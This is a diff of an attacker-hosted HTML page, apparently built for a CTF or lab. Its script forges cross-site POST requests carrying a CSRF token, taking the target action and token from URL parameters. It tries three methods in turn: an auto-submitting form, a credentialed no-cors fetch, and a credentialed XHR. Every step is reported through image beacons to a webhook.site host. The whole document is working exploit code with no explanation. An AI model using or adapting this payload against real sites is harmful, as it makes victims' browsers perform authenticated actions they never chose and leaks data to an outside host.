@@ -2,20 +2,78 @@
 <html>
 <body>
 <script>
+var WEBHOOK = 'https://webhook.site/0238ce48-0773-47a3-983d-ccb0b5dc3edc';
+
+function ping(label, extra) {
+  try {
+    var img = new Image();
+    var q = '?step=' + encodeURIComponent(label);
+    if (extra) q += '&info=' + encodeURIComponent(extra);
+    img.src = WEBHOOK + q + '&t=' + Date.now();
+  } catch (e) {}
+}
+
+ping('loaded', location.href);
+
 var params = new URLSearchParams(window.location.search);
 var action = params.get('action');
 var csrf = params.get('csrf');
+
+ping('parsed', 'action=' + action + ' csrf_len=' + (csrf ? csrf.length : 0));
+
 if (action && csrf) {
-  var form = document.createElement('form');
-  form.method = 'POST';
-  form.action = action;
-  var input = document.createElement('input');
-  input.type = 'hidden';
-  input.name = 'csrf_token';
-  input.value = csrf;
-  form.appendChild(input);
-  document.body.appendChild(form);
-  form.submit();
+  // Technique 1: classic auto-submit form (top-level navigation)
+  try {
+    var form = document.createElement('form');
+    form.method = 'POST';
+    form.action = action;
+    var input = document.createElement('input');
+    input.type = 'hidden';
+    input.name = 'csrf_token';
+    input.value = csrf;
+    form.appendChild(input);
+    document.body.appendChild(form);
+    ping('about_to_submit_form');
+    form.submit();
+  } catch (e) {
+    ping('form_submit_err', String(e));
+  }
+
+  // Technique 2: fetch with no-cors (in case form submit is blocked)
+  setTimeout(function () {
+    try {
+      fetch(action, {
+        method: 'POST',
+        mode: 'no-cors',
+        credentials: 'include',
+        headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
+        body: 'csrf_token=' + encodeURIComponent(csrf)
+      }).then(function () {
+        ping('fetch_ok');
+      }).catch(function (e) {
+        ping('fetch_err', String(e));
+      });
+    } catch (e) {
+      ping('fetch_throw', String(e));
+    }
+  }, 500);
+
+  // Technique 3: XHR
+  setTimeout(function () {
+    try {
+      var xhr = new XMLHttpRequest();
+      xhr.open('POST', action, true);
+      xhr.withCredentials = true;
+      xhr.setRequestHeader('Content-Type', 'application/x-www-form-urlencoded');
+      xhr.onload = function () { ping('xhr_done', String(xhr.status)); };
+      xhr.onerror = function () { ping('xhr_err'); };
+      xhr.send('csrf_token=' + encodeURIComponent(csrf));
+    } catch (e) {
+      ping('xhr_throw', String(e));
+    }
+  }, 1000);
+} else {
+  ping('missing_params');
 }
 </script>
 </body>
